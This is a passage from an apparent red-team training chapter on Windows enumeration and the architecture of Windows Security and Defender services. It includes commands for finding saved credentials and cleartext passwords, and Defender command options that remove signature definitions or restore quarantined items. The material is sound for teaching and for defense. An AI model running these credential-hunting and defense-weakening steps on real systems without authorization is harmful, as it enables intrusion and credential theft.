<p>We can follow this up by using the <code>net</code> command to determine which users are a part of any given group:
<img src="https://hackmd.io/_uploads/r1ra1xZy-l.png" alt="image" /></p>
<p>To find credentials for user, system, and domain accounts, we need to enumerate systems and domains. For instance, <code>cmdkey</code> can be used to display all of the credentials currently saved by the operating system for automatic access to network resources, websites, and other secured locations:
<img src="https://hackmd.io/_uploads/ByjGu1qWbx.png" alt="image" /></p>
<p>We can also quickly search through various types of files for references to passwords, in order to learn more about password rules, properties, and (in some unique cases) cleartext password values using the <code>findstr</code> command:</p>
<pre><code class="language-PowerShell">PS C:\&gt; findstr /si password *.doc *.txt *.ini *.config
</code></pre>
<p>This can be expanded upon by searching for the <code>pass</code> phrase within configuration files for certain services:
<img src="https://hackmd.io/_uploads/BJ6m5E5bZl.png" alt="image" /></p>
<p>We may be able to find user credentials saved in certain registry keys, under both <code>HKLM</code> and <code>HKCU</code>:
<img src="https://hackmd.io/_uploads/BJG5q4qWZe.png" alt="image" /></p>
<p>Try looking for passwords at <code>C:\Users\&lt;username&gt;\AppData\Local\</code> as well. This directory contains data for locally installed apps. Certain applications, like web browsers keep track of user data and save it in their own private directory structure. Consider <code>Microsoft Edge</code>, a Chromium based web-browser that comes pre-installed on Windows. It keeps important data stored here: <code>C:\Users\&lt;username&gt;\AppData\Local\</code>, including things such as:</p>
<ul>
<li>User History</li>
<li>Autofill Web Data</li>
<li>Cookies</li>
<li>User Credentials</li>
</ul>
<p>Although much of this data is encrypted using DPAPI, capturing the encrypted data is the first step toward obtaining the unencrypted credentials.</p>
<p>User enumeration is extremely important, as it informs operators about their current context as a user, which other accounts exist on a system, and the levels of privilege they may be able to escalate to.</p>
<h3 id="network-enumeration"><a class="header" href="#network-enumeration">Network Enumeration</a></h3>
<p>The main command for network operations is <code>ipconfig</code>. Although it is capable of many things, for network enumeration there are two options to focus on.</p>
<p>First, to show the full details of every network, use the <code>/all</code> option:
<img src="https://hackmd.io/_uploads/rk_oIu-1be.png" alt="image" />
This provides important information about the connected network interfaces, including their DHCP connection details, default DNS servers, and assigned MAC addresses.</p>
<p><code>ifconfig</code> can also be used to gather information about the local DNS cache:
<img src="https://hackmd.io/_uploads/rkVa_u-1-e.png" alt="image" /></p>
<p><code>wmic</code> is also extremely useful for network enumeration. It can gather information about the network interfaces, available network protocols, and active network connections.
<img src="https://hackmd.io/_uploads/S18hMeWJZx.png" alt="image" />
<img src="https://hackmd.io/_uploads/S1UfjdW1be.png" alt="image" /></p>
<blockquote>
<p>The <strong>CIM</strong> equivalents are:</p>
</blockquote>
<pre><code class="language-PowerShell">PS&gt; Get-CimInstance -ClassName Win32_NetworkAdapter \
| Select-Object AdapterType, InterfaceIndex, MacAddress

PS&gt; Get-CimInstance -ClassName Win32_NetworkConnection \
| Select-Object Name, Status, ConnectionType
</code></pre>
<p>Finally, you can monitor active network connections using the <code>netstat</code> utility:
<img src="https://hackmd.io/_uploads/rJkuRO-1be.png" alt="image" /></p>
<p><code>netstat</code> can also be used to view the routing table on the system, showing you how the system decides where to send packets:
<img src="https://hackmd.io/_uploads/HJ3BJF-yWl.png" alt="image" /></p>
<p>Network enumeration is important because it shows how a single system is connected to other computer systems. It gives you an idea of how any given system can communicate, and to who with what privileges. As a red team operation continues to grow in scale, this becomes incredibly important as it gives context to what other systems may be available to compromise.</p>
<h3 id="enumerating-security-systems"><a class="header" href="#enumerating-security-systems">Enumerating Security Systems</a></h3>
<p>Windows Defender is an anti-virus software that comes pre-installed on Windows 10+ systems. We will take a more in depth look at how it works later. For now, we can check the status of the service using the <code>sc</code> command. There is one problem though. PowerShell has a cmdlet called <code>Set-Content</code>, which will write or replace the contents of a file. This cmdlet uses <code>sc</code> as a shorthand, so in order to run <code>sc.exe</code> you must either provide the entire executable name or run the command outside of PowerShell, in <code>cmd.exe</code>:
<img src="https://hackmd.io/_uploads/H1yeRpu-We.png" alt="image" /></p>
<blockquote>
<p>Using <code>sc.exe</code> to query the Service Control Manager about <code>WinDefend</code></p>
</blockquote>
<p><img src="https://hackmd.io/_uploads/SymSCT_-We.png" alt="image" /></p>
<blockquote>
<p>Using <code>cmd /c</code> to query the <strong>Service Control Manager</strong> (SCM) about <code>WinDefend</code></p>
</blockquote>
<p>Details about the configuration of a particular service can be queries using <code>sc qc &lt;servicename&gt;</code>:
<img src="https://hackmd.io/_uploads/rkL6TZyM-e.png" alt="image" /></p>
<p>More security services can be found by querying the SCM for any services that are running:</p>
<pre><code class="language-PowerShell">PS&gt; sc.exe queryex type=service
</code></pre>
<p>Some example services include:</p>
<ul>
<li>
<p><strong>Base Filtering Engine</strong> (<code>BFE</code>): A critical user-mode Windows Service, which implements and enforces all of the filtering policies for firewalls, antivirus products, and traffic inspection tools. It is an important part of the <strong>Windows Filtering Platform</strong> (WFP).
<img src="https://hackmd.io/_uploads/HyzPKAdWZx.png" alt="image" /></p>
</li>
<li>
<p><strong>Windows Event Log</strong> (<code>EventLog</code>): A Windows Service, which is responsible for accepting event log files from applications, the OS kernel, and drivers and aggregating them in a centralized, hierarchical location (<code>C:\Windows\System32\winevt\Logs</code>). Importantly, it records security related events, such as:</p>
<ul>
<li>Successful or failed user login/logoff attempts</li>
<li>Object Access</li>
<li>Changes to the Security Policy</li>
</ul>
<p><img src="https://hackmd.io/_uploads/Skx1iROWZx.png" alt="image" /></p>
</li>
<li>
<p><strong>Windows Defender Firewall</strong> (<code>mpssvc</code>): Also known as the <strong>Microsoft Protection Service</strong>, it is the main executable which runs the logic for the Windows Firewall. It creates low-level filter objects and passes them to the <strong>BFE</strong> using WFP APIs so they can be enforced.
<img src="https://hackmd.io/_uploads/BJnWa0dbZl.png" alt="image" /></p>
</li>
<li>
<p><strong>Security Accounts Manager</strong> (<code>SamSs</code>): The service which manages the <strong>SAM Database</strong> and is used by the <strong>Local Security Authority Subsystem Service</strong> to verify user credentials.
<img src="https://hackmd.io/_uploads/S1FQCAd-Wl.png" alt="image" /></p>
</li>
<li>
<p><strong>Windows Security Service</strong> (<code>SecurityHealthService</code>): The Windows Service responsible for managing the user interface for Windows Security, running all of the background processes that allow the Windows Security UI to interact with all underlying security providers, and aggregating security status information from these providers, including:</p>
<ul>
<li>Windows Defender Antivirus</li>
<li>Windows Firewall</li>
<li>User Account Control Settings</li>
<li>SmartScreen Status</li>
<li>Application and Browser Control Settings
When a user interacts with the UI, <code>SecurityHealthService</code> is responsible for relaying that command to the appropriate underlying service.
<img src="https://hackmd.io/_uploads/B1Vayyt-Zg.png" alt="image" /></li>
</ul>
</li>
</ul>
<p>Plenty of other security services can be found by inspecting the output of this command.</p>
<p><code>netsh</code> can be used to locally or remotely interact with network components, including network services. It is particularly useful for enumerating and managing firewall rules. The <code>netsh advfirewall show</code> command can be used to inspect the firewall properties of a given profile:
<img src="https://hackmd.io/_uploads/SkgXNJtZbx.png" alt="image" /></p>
<p>An <strong>Access Control List</strong> (ACL) can be enumerated to determine the permissions granted to a security principal for a dynamic, running object managed by the OS kernel.</p>
<p>Let's consider the <code>Windefend</code> service for a moment:
<img src="https://hackmd.io/_uploads/rk1jRP2WWe.png" alt="image" />
Here, we can see that it is running on the system, it has a <strong>PID</strong> of <code>3268</code> and it can receive commands for stopping and cleanly exiting before shutdown. An additional query will detail the permissions granted to manage the service for different security principals:
<img src="https://hackmd.io/_uploads/By1Fgd3-Wx.png" alt="image" /></p>
<p>The provided output is not exactly readable. It is called a <strong>Security Descriptor Definition Language</strong> (SDDL) <strong>String</strong>. It can be divided into two distinct parts: the Structure and the <strong>Access Control Entries</strong> (ACEs):
<img src="https://hackmd.io/_uploads/rk9DU_3b-g.png" alt="image" /></p>
<p>The Structure value indicates which ACL is being displayed: the <code>DACL</code> or the <code>SACL</code>:</p>
<ul>
<li><code>DACL</code>: <strong>Discretionary Access Control List</strong>. Defines who is allowed or denied certain permissions.</li>
<li><code>SACL</code>: <strong>System Access Control List</strong>. Defines which user actions should be logged to the <strong>Windows Security Event Log</strong>.</li>
</ul>
<p>The Access Control Entries show the actual permissions given to a particular set of security principals. Within each entry, there are 6 sections:
<img src="https://hackmd.io/_uploads/S1N1njTZbe.png" alt="image" /></p>
<ul>
<li>
<p><code>Type</code>: Indicates whether the rule grants access or is for auditing.</p>
<ul>
<li><code>A</code> (DACL): Grants permissions for the specified <code>&lt;Rights&gt;</code>.</li>
<li><code>D</code> (DACL): Blocks permissions for the given <code>&lt;Rights&gt;</code>.</li>
<li><code>AU</code> (SACL): Defines auditing rules. Logs access attempts (success, failure, or both) depending on flags (<code>SA</code> or <code>FA</code>)</li>
</ul>
</li>
<li>
<p><code>Flags</code>: Determines how the ACE should be inherited by child objects. Particularly relevant for folder permissions.</p>
<ul>
<li><code>OI</code>: <strong>Object Inherit</strong>. Child objects that are not containers (like files) inherit the ACE.</li>
<li><code>CI</code>: <strong>Container Inherit</strong>. Child objects that are containers (like folders) inherit the ACE.</li>
<li><code>NP</code>: <strong>No Propogate</strong>. The inheritance stops after the first generation of child objects.</li>
<li><code>IO</code>: <strong>Inherit Only</strong>. The ACE only applies to child objects, not the object it is set on.</li>
<li><code>SA</code>: <strong>Successful Access</strong>. Logs an event if an attempted action succeeds.</li>
<li><code>FA</code>: <strong>Failed Access</strong>: Logs an event if an attempted action fails.</li>
</ul>
</li>
<li>
<p><code>Rights</code>: The set of permissions, depending on what type of object is being protected (file, folder, registry key, process, or service). They can be represented by mnemonic codes (like <code>FA</code>) or raw, hexadecimal values (like <code>0x1F01FF</code>). There are quite a few, but here we will list some which are relevant to processes/services:</p>
<ul>
<li><strong>CC</strong> <code>0x0001</code>: <strong>Query Config</strong>. Permission to read the configuration state of a given service.</li>
<li><strong>LC</strong> <code>0x0004</code>: <strong>Query Status</strong>. Permission to request the current status of a service from the SCM.</li>
<li><strong>SW</strong> <code>0x0008</code>: <strong>Enumerate Dependents</strong>. Permission to retrieve a list of services that depend on a given service.</li>
<li><strong>RP</strong> <code>0x0010</code>: <strong>Start</strong>. Permission to start the service.</li>
<li><strong>WP</strong> <code>0x0020</code>: <strong>Stop</strong>. Permission to stop the service.</li>
<li><strong>DT</strong> <code>0x0040</code>: <strong>Pause/Continue</strong>. Permission to pause or continue a service.</li>
<li><strong>LO</strong> <code>0x0080</code>: <strong>Interrogate</strong>. Permission to update the SCM with the current status of the service.</li>
<li><strong>CR</strong> <code>0x0100</code>: <strong>User Defined Control</strong>. Permission to send developer defined control codes to the service.</li>
<li><strong>RC</strong> <code>0x20000</code>: <strong>Read Control</strong>. Permission to read the given service's ACL.</li>
</ul>
<div id="admonition-note-15" class="admonition admonish-note" role="note" aria-labelledby="admonition-note-15-title">
<div class="admonition-title">
<div id="admonition-note-15-title">
<p>Note</p>
</div>
<a class="admonition-anchor-link" href="Windows.html#admonition-note-15"></a>
</div>
<div>
<p><strong>You may have noticed</strong> that the mnemonics for most of the Service Access Rights (i.e., <code>LO</code> for <strong>Interrogate</strong>). A simple explanation is that <strong>SDDL</strong> strings are applied to many different types of objects and the permissions themselves are interpreted by different Object Managers to mean different things. Many mnemonics are used in circumstances outside of their original intention, but their raw hexadecimal values still have specific meaning. This is why a mnemonic like <code>CC</code> (<strong>Create Child</strong>) with a raw value of <code>0x0001</code> will grant configuration access rights. <code>CCLCSWRPWPDTLOCRRC</code> is the standard access right for granting full permission over a service to a security principal.</p>
</div>
</div>
</li>
<li>
<p><code>Object GUID</code>: <strong>Only used for Object Specific ACEs</strong>. Defines a specific object property to protect. Typically empty for processes/services.</p>
</li>
<li>
<p><code>Inherit GUID</code>: <strong>Only used for Object Specific ACEs</strong>. Defines the type of object that inherits the ACE. Typically empty for processes/services.</p>
</li>
<li>
<p><code>SID</code>: The <strong>Security Identifier</strong> (SID) for a given security principal (user, group, service) the permissions apply to. This value can also be represented by constant values:</p>
<ul>
<li><code>SY</code>: Local System (<code>NT Authority\System</code>)</li>
<li><code>BA</code>: Built in Administrator (<code>BUILTIN\Administrators</code>)</li>
<li><code>IU</code>: Interactive Users (Any user logged into the console)</li>
<li><code>SU</code>: Service Users (Any user logged on as a service)</li>
<li><code>WD</code>: Everyone (World)</li>
</ul>
</li>
</ul>
<p>Documentation on <code>SDDL</code> strings can be found within the <a href="https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language">Microsoft SDK Documentation</a>. <code>SDDL</code> values specific to services can be found <a href="https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights">here</a>. In some instances, a 7th <code>(resource-attribute)</code> section is used to define the data type, though this does not apply here.</p>
<p>Permissions for static objects can be read using <code>icacls</code>:
<img src="https://hackmd.io/_uploads/SylUyApZZx.png" alt="image" /></p>
<p>For the current directory <code>.</code>, each security principal has the <strong>Inherit Only</strong> (<code>I</code>), <strong>Object Inherit</strong> (<code>OI</code>), and <strong>Container Inherit</strong> (<code>CI</code>) flags set and has been granted <strong>Full Control</strong> (<code>F</code>) over the directory's objects.</p>
<p><strong>Scheduled Tasks</strong> are useful because they automate the execution of certain actions based on different triggers. They can be enumerated using the <code>schtasks</code> command:
<img src="https://hackmd.io/_uploads/SJh7RR6Wbx.png" alt="image" /></p>
<p>This can produce a lot of output. To check the status of a single scheduled task, use the <code>tn</code> (task name) option:
<img src="https://hackmd.io/_uploads/BySdCRTbbg.png" alt="image" /></p>
<p>You can use the <code>Get-ScheduledTask</code> PowerShell cmdlet to get information about all of the scheduled tasks in a particular folder:
<img src="https://hackmd.io/_uploads/BJWdJJRbbx.png" alt="image" /></p>
<h2 id="windows-security"><a class="header" href="#windows-security">Windows Security</a></h2>
<p><strong>Windows Security</strong> is the unified hub that consolidates the status, settings, and controls for several core system defense components, including:</p>
<ul>
<li><strong>Virus &amp; Threat Protection</strong> (Microsoft Defender Antivirus)</li>
<li><strong>Firewall &amp; Network Protection</strong></li>
<li><strong>Account Protection</strong></li>
<li><strong>App &amp; Browser Control</strong></li>
<li><strong>Device Security</strong></li>
</ul>
<p>Windows Security is the interface used to manage the low-level security services running on the operating system. The various components work together in a layered fashion to process information and enforce security policies.</p>
<p>Users or system policy can set rules via the UI. The <code>SecurityHealthService</code> receives these rules as input and passes them to the <strong>Microsoft Defender Service</strong> (<code>MsMpEng.exe</code>). The Defender engine runs at a privileged level, using kernel callbacks and filters to intercept file system operations and network traffic. When a scripting engine is about to execute code, it uses the <strong>Anti-malware Scan Interface</strong> (AMSI) to send the script content to the Defender before execution begins. If the code is malicious, Defender blocks it, preventing <strong>fileless malware</strong> from running. If Defender detects a threat, it performs some pre-configured action (quarantine, clean, block) and immediately sends an alert to <code>SecurityHealthService</code>, which then updates the status displayed in the UI.</p>
<h3 id="structure"><a class="header" href="#structure">Structure</a></h3>
<p>Windows Security is the interface, which allows users to monitor and configure different security services that run on the system. These services can be divided into 4 general categories:</p>
<ul>
<li><strong>Core Antivirus &amp; File Protection</strong></li>
<li><strong>Network &amp; Web Defense Services</strong></li>
<li><strong>Health &amp; Management Services</strong></li>
<li><strong>Advanced Controls</strong></li>
</ul>
<h4 id="core-antivirus--file-protection"><a class="header" href="#core-antivirus--file-protection">Core Antivirus &amp; File Protection</a></h4>
<p>The <strong>Microsoft Defender Antivirus Service</strong> (shortname <code>WinDefend</code>) is the most critical component of Windows Security as it performs all the fundamental tasks required for endpoint protection, including system monitoring, updating malware definitions, and scanning accessed files. Its main executable, <code>MsMpEng.exe</code> can usually be found here:
<code>C:\ProgramData\Microsoft\Windows Defender\Platform\&lt;version&gt;\MsMpEng.exe</code>. This can be verified using <code>sc.exe qc WinDefend</code>. Its primary responsibilities include:</p>
<ul>
<li><strong>Real-Time Protection</strong>: Actively monitoring all file system activity. When a file is created, opened, or executed, <code>MsMpEng.exe</code> intercepts the operation to scan the file before the system can process it.</li>
<li><strong>Signature-Based Detection</strong>: Compares the content of files and memory against its database of known malware signatures.</li>
<li><strong>Heuristic and Behavioral Analysis</strong>: Watches for activities that don't match a known signature for a legitimate program.</li>
<li><strong>AMSI Integration</strong>: Handles requests from the <strong>Anti-malware Scan Interface</strong>. When a scripting host is about to execute code, it passes the script to <code>MsMpEng.exe</code> for scanning and blocking, even if the script is completely fileless.</li>
<li><strong>Tamper Protection</strong>: A Defense-Hardening feature that ensures critical security settings cannot be disabled by malware or scripts. Supported by <code>WdBoot.sys</code> and <code>WdFilter.sys</code> kernel drivers, which guarantee that <code>MsMpEng.exe</code> can initialize in a protected environment and provide resilience against user‑mode tampering by ensuring malicious activity is blocked before reaching kernel-mode.</li>
<li><strong>Malware Remediation</strong>: Handles the quarantine, deletion, or cleaning of infected files, registry keys, and system configurations when malware is discovered.</li>
<li><strong>SmartScreen Application Checks</strong>: A reputation-based protection system which is deeply integrated into Microsoft Edge and blocks or warns users before they access phishing sites, malicious downloads, or suspicious apps by checking them against Microsoft's Threat Intelligence.</li>
<li><strong>Exploit Guard</strong>: A collection of four components that provides defense-in-depth on Windows systems. <code>Windefend</code> plays a role in configuring/managing each of them:
<ul>
<li><code>Attack Surface Reduction</code> (ASR): Manages and enforces rules which target specific risky events to prevent actions and behaviors commonly used by malware to infect machines. <code>MsMpEng.exe</code> uses its high privileges and minifilter drivers (<code>WdFilter.sys</code>) to intercept system calls and block high risk behaviors (i.e., blocking Office Apps from spawning child processes) before they can execute.</li>
<li><code>Exploit Protection</code>: Applies process mitigation techniques, such as <strong>Address Space Layout Randomization</strong>, <strong>Data Execution Prevention</strong>, and <strong>Control Flow Guard</strong>, making it harder for attackers to exploit vulnerabilities. While the core mitigations are handled by the Windows Kernel and Memory Manager, <code>MsMpEng.exe</code> and its associated components manage the policy and configuration for applying these mitigations to individual processes.</li>
<li><code>Controlled Folder Access</code> (CFA): Protects important files and folders from unauthorized changes, especially from ransomware and other malicious software that attempts to encrypt, modify, or delete data. <code>MsMpEng.exe</code> intercepts attempts to write or modify files in protected folders and compares the attempting process against the list of approved applications, blocking unauthorized access.</li>
<li><code>Network Protection</code>: Blocks outbound connections to malicious IP addresses and domains. <code>MsMpEng.exe</code> contains the necessary intelligence and communicates with the Network Inspection Service (<code>WdNisSvc</code>) to ensure that malicious connections are blocked at the network stack.</li>
</ul>
</li>
</ul>
<p><code>MsMpEng.exe</code> typically runs with very high privileges (<code>LocalSystem</code> or <code>NetworkService</code>). This is because it needs to reliably detect, block, or remove malware that hides in protected areas of the OS. To provide system-wide protection, it must monitor and intercept activity across the entire system - files, processes, registry keys, services, and network traffic. To do this requires kernel-level visibility and the ability to act on behalf of any user. To intercept file operations and network traffic, <code>MsMpEng.exe</code> uses minifilter drivers (i.e., <code>WdFilter.sys</code>), which require user-mode applications to have high privileges to facilitate direct coordination. If malware is detected, WinDefend may need to kill processes owned by other users, delete or quarantine files in protected system directories, or modify registry keys or system configurations. These actions require <code>LocalSystem</code> or <code>NetworkService</code> permissions.</p>
<p>The integrity and operational status of <code>MsMpEng.exe</code> is of the utmost importance, as if an adversary is able to disable or bypass this service, they have essentially disarmed the system's primary defense.</p>
<p>The <strong>Microsoft Defender Antivirus Reliability Service</strong> (shortname <code>dsSvc</code>) is responsible for maintaining the integrity of the Microsoft Defender Antivirus and its security intelligence. <code>dsSvc</code> runs as a DLL, hosted within a generic Service Host process (<code>svchost.exe</code>). It's system configuration information can be found at <code>HKLM\SYSTEM\CurrentControlSet\Services\DsSvc</code> and the DLL itself is typically found at <code>C:\Windows\System32\dssvc.dll</code>.</p>
<p>While <code>MsMpEng.exe</code> runs the core scanning logic, <code>dsSvc</code> handles the necessary reliability maintenance (self-healing, stability checks), ensuring that <code>MsMpEng.exe</code> is always running and recoverable. It's core responsibilities are:</p>
<ol>
<li>Supporting the broader Defender infrastructure by coordinating with the Service Control Manager to keep protection active and reliable.</li>
<li>Maintain the operational health and integrity of the core anti-malware platform and other associated Defender components.</li>
<li>Responsible for quickly restarting <code>MsMpEng.exe</code> or attempting to restore its functionality in the event that the service crashes, hangs, or is successfully terminated.</li>
</ol>
<p><code>dssvc</code> is a redundant supervisor which serves to protect the main system from certain operational failures. By having a separate, lightweight and dedicated service, Windows ensures that having a failure in the main defense process does not lead to a permanent, unprotected state.</p>
<h4 id="network--web-protections"><a class="header" href="#network--web-protections">Network &amp; Web Protections</a></h4>
<p>The <strong>Windows Defender Antivirus Network Inspection Service</strong> (shortname <code>WdNisSvc</code>) is a critical component of Windows Security that provides network-level protection by inspecting incoming and outgoing network traffic. It is the primary engine for <strong>Web Defense</strong> and <strong>Network Protection</strong> within the Defender suite. <code>NisSrv.exe</code> is the main executable for the service and it is typically located at <code>C:\ProgramData\Microsoft\Windows Defender\Platform\&lt;version&gt;\NisSrv.exe</code>. This can be verified using <code>sc.exe qc WdNisSvc</code>. <code>WdNisSvc</code> is triggered when real-time protection or exploit protection features are enabled. It monitors network packets and application traffic for suspicious patterns and if malicious activity is detected, it can block the connection, alert the user, and log the event in Defender's security history.</p>
<p><code>WdNisSvc</code> has two main responsibilities:</p>
<ul>
<li><strong>Monitoring Network Traffic</strong>: It intercepts network packets using the Base Filtering Engine <code>BFE</code>, then examines the content of the data stream for malicious patterns.</li>
<li><strong>Intrusion Prevention</strong>: It functions as a <strong>Host-based Intrusion Prevention System</strong> (HIPS) by checking traffic against Microsoft's threat intelligence, identifying and blocking network exploits, known attack payloads, and suspicious protocol activity.</li>
</ul>
<p><code>WdNisSvc</code> is crucial for network defense. Its main function is to act as a security layer deep within the Windows network stack, protecting the system before malicious data reaches the application layer (i.e., web browsers and email clients)</p>
<p>The <strong>Windows Defender Firewall</strong> (shortname <code>MpsSvc</code>) is the core system service responsible for implementing and enforcing the host-based firewall functionality on Windows. It controls which network traffic is allowed to enter or leave the system based on a set of administrator defined rules. <code>MpsSvc</code> runs as a DLL, hosted within a generic Service Host process (<code>svchost.exe</code>). It's system configuration information can be found at <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\MpsSvc</code>and its main library file <code>mpssvc.dll</code> can be found at <code>C:\Windows\System32\mpssvc.dll</code>.</p>
<p><code>MsSvc</code> starts automatically with Windows to ensure security from boot. Firewall rules are applied by the user, system defaults, and enterprise policies. Packets are blocked at the Network layer to block suspicious or unauthorized traffic. Blocked traffic and firewall activity are recorded in the <strong>Windows Event Log</strong>.</p>
<p><code>MpsSvc</code> has a few different responsibilities. First and foremost, it monitors all incoming and outgoing network communications on the host and applies security policy rules to determine whether to allow or block specific traffic. It also maintains a record of active network connections. That way, if an application sends some outbound traffic on the network, the inbound reply is automatically let through. <code>MpsSvc</code> can also inspect which application or process is trying to communicate and apply certain rules based on that application's executable path, digital signature or service name. Finally, it is capable of enforcing different sets of rules dynamically, based on the current network environment applied to the host: <strong>Domain</strong>, <strong>Private</strong>, or <strong>Public</strong> networks.</p>
<p><code>MpsSvc</code> relies entirely on the <strong>Base Filtering Engine</strong> (BFE) to enfoce the rules that it manages. Essentially, both <code>MpsSvc</code> and <code>WdNisSvc</code> create policies for the type of traffic that is allowed to enter/exit the system, based on the trust level of the applications and processes that wish to communicate over the network and the actual content within the packets being transmitted, respectively.</p>
<p>The <strong>Base Filtering Engine</strong> is a critical, fundamental system service that manages firewall and <strong>Internet Protocol Security</strong> policies and implements user mode filtering. It serves as the core networking infrastructure for many security-related features in Windows. Without it, the Windows Defender Firewall and other filtering features can not function. <code>BFE</code> runs as a DLL, hosted within a generic Service Host process (<code>svchost.exe</code>). Its system configuration information can be found at <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\BFE</code> and its main library file can be found at <code>C:\Windows\System32\bfe.dll</code>.</p>
<p><code>BFE</code> starts automatically with Windows, as <code>MpsSvc</code> and other networking features rely on it to function and they too need to be available at start. It provides an interface for user-mode applications to interact with the <strong>Windows Filtering Platform</strong> (WFP). WFP API calls are exposed through <code>C:\Windows\System32\fwpuclnt.dll</code> to client applications, although they are implemented as <strong>Remote Procedure Calls</strong>, meaning the actual code for each API call is found within the <code>BFE</code> service. <code>BFE</code> then makes the transition from user-mode to kernel mode by calling <code>DeviceIoControl</code> to pass the processed filtering policies to the <code>fwpkclnt.sys</code> kernel driver. <code>C:\Windows\System32\drivers\fwpkclnt.sys</code> is then responsible for injecting the code hooks into the network stack's data path, enforcing the policy rules. The resulting value gets passed back up the stack to the client application.</p>
<h4 id="health-ui-and-management"><a class="header" href="#health-ui-and-management">Health, UI, and Management</a></h4>
<p>The <strong>Windows Security Center Service</strong> (shortname <code>wscsvc</code>) monitors and reports security health settings on the computer, including the state of the firewall, antivirus, antispyware, Windows Update, User Account Control, and Internet Settings. also provides <strong>Component Object Model</strong> (COM) APIs, so that third-party software vendors can also report the state of their services to the <code>wscsvc</code>. Essentially, it acts as the central hub to ensure users and administrators are notified when essential protections are disabled or missing. <code>wscsvc</code> runs as a DLL, hosted within a generic Service Host process (<code>svchost.exe</code>). Its system configuration settings are stored at <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\wscsvc</code> and its main library file can be found at <code>C:\Windows\System32\wscsvc.dll</code>.</p>
<p><code>wscsvc</code> starts with Windows to ensure continuous monitoring. It queries Windows Defender Antivirus, Firewall (MpsSvc), and Windows Update. It aggregates status information and reports it to the Windows Security UI, through the <code>SecurityHealthService</code>. If something is disabled or requires attention, it generates alert notifications in Windows Security. It doesn't block threats, but it makes sure you are informed about the state of your Windows Security Services. It should not be disabled, as it will stop notifications about disabled or missing security services.</p>
<p><code>SecurityHealthService</code> is a core background service in Windows 10+ that monitors the overall security posture of your system, ensuring that antivirus, firewall, updates, and other protection features are active and functioning correctly. It works in concert with the Windows Security Center Service to collect and manage health information, ensuring that the user interface (<code>SecHealthUI.exe</code>) provides the most up-to-date information about the protection status of the endpoint. It starts automatically with Windows and is required for the Windows Security app to display accurate information. It provides an interface API that third-party security services can use to register their product's status, ensuring that the Windows Security interface provides a unified view of all protective layers. It's executable file is stored at <code>C:\Windows\system32\SecurityHealthService.exe</code>.</p>
<p><code>SecHealthUI</code> is the user-facing client application that displays the health status of the lower-level Windows Security services. It consumes data provided by <code>SecurityHealthService</code> and other system APIs to show whether protections are active in a unified graphical user interface. It is also responsible for command dispatch. User actions are translated into commands that are dispatched to the appropriate low-level security services. This gives users and administrators the ability to monitor and configure all Windows Security services installed on the system in a centralized location.</p>
<p><img src="https://hackmd.io/_uploads/BkEGYUNMbl.png" alt="image" /></p>
<h4 id="advanced-control"><a class="header" href="#advanced-control">Advanced Control</a></h4>
<p>While <code>UAC</code> is a core Operating System feature, and not a component of Windows Security, together they contribute to the defense-in-depth approach on modern Windows systems. Essentially, <strong>User Account Control</strong> (UAC) is a system that prompts users to approve or deny changes initiated by actions that require a <strong>High Integrity Level</strong> (more on this in <code>Malware Essentials</code>), reducing the risk of malware or accidental modification. When a user attempts to take an action, the OS detects the elevation request and launches <strong>Consent UI</strong> (<code>consent.exe</code>). If the user is admin, they must approve or deny. If the user is standard, they must provide admin credentials. Once approved, the operation is conducted with elevated privileges.
<img src="https://hackmd.io/_uploads/By_0R8NG-x.png" alt="image" /></p>
<p>Similarly, the <strong>Windows Updater</strong> is not a component of <strong>Windows Security</strong>, however the two components have an important role in maintaining the security of the system. Updater distributes operating system patches, feature upgrades, driver updates, and security fixes. This ensures that the OS and its components are current, closing vulnerabilities and improving stability. Vulnerabilities in Windows Security services are fixed through updates, along with malware definitions and engine updates. The service name is <code>wuauserv</code> and it is part of a shared service (<code>svchost.exe</code>). It is implemented as a few different libraries, saved in <code>C:\Windows\System32\</code>:</p>
<ul>
<li><code>wuaueng.dll</code>: Windows Update Agent Engine (Core Logic)</li>
<li><code>wuapi.dll</code>: Windows Update API Interface</li>
<li><code>wucltux.dll</code>: Windows Update Client UI</li>
<li><code>wups.dll</code>/<code>wups2.dll</code>: Windows Update client proxy stub</li>
<li><code>wuwebv.dll</code>: Web-Based Windows Update control</li>
</ul>
<p>Essentially, Windows Updater is the delivery mechanism, while Windows Security is the monitoring and enforcement hub. They cooperate to maintain the security of the system in an evolving threat landscape.</p>
<h3 id="interface"><a class="header" href="#interface">Interface</a></h3>
<p><code>SecHealthUI.exe</code> is the executable for the <strong>Windows Security UI</strong>. However, <code>MpCmdRun.exe</code> is a command-line utility which allows users to interact with <code>MsMpEng.exe</code> directly. It can be used for a variety of tasks, including updating system components, running antimalware scans on files, restoring system configurations, and testing network connection to available security services. Here, we will go over a few useful commands that can be used to interact with the service.</p>
<ul>
<li>
<p><code>MpCmdRun.exe -SignatureUpdate</code>: Forces Microsoft Defender to immediately check for and download the latest security intelligence updates.
<img src="https://hackmd.io/_uploads/rJcQMdEzWe.png" alt="image" /></p>
</li>
<li>
<p><code>MpCmdRun.exe -Scan -ScanType 1</code>: Runs a Quick Scan, checking common malware locations, memory, and startup files. This is the fastest and most common scan type.
<img src="https://hackmd.io/_uploads/BkzTm_NzZl.png" alt="image" /></p>
</li>
<li>
<p><code>MpCmdRun.exe -Scan -ScanType 2</code>: Runs a Full Scan, scanning all files and running processes on the local hard disk. It takes significantly more time than a Quick Scan, but is more thorough.
<img src="https://hackmd.io/_uploads/SkPCOOVz-e.png" alt="image" /></p>
</li>
<li>
<p><code>MpCmdRun.exe -Scan -ScanType 3 -File &lt;file_path&gt;</code>: Runs a scan against a specific file or directory. It is useful for targeted analysis of suspicious files.
<img src="https://hackmd.io/_uploads/B1uk6dEMbl.png" alt="image" /></p>
<ul>
<li>Use <code>-DisableRemediation</code> to prevent Defender from taking action if malware is found. This is useful for analysts who want to inspect the malware before it is removed.</li>
</ul>
</li>
<li>
<p><code>MpCmdRun.exe -Restore -All</code>: Restores all items that are currently in the quarantine folder back to their original locations.</p>
</li>
<li>
<p><code>MpCmdRun.exe -RemoveDefinitions -All</code>: Removes all downloaded security intelligence definitions.</p>
</li>
<li>
